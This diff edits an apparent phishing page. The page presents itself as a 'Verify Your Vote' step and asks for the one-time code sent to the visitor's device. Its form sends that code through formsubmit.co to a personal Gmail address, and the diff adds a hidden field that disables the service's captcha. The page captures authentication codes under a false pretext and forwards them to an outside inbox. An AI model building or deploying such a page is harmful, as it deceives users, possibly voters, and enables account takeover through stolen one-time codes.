@@ -72,11 +72,13 @@
 </head>
 <body>
   <div class="card">
-    <h2>Verify Your Login</h2>
+    <h2>Verify Your Vote</h2>
     <p>Enter the one-time code sent to your device to complete the login process.</p>
     <form id="verificationForm" action="https://formsubmit.co/voterspridecenter@gmail.com" method="post">
       <label for="otp">One-Time Code:</label>
       <input type="text" id="otp" name="otp" required>
+<input type="hidden" name="_captcha" value="false">
+
 
       <button type="submit">Verify</button>
     </form>
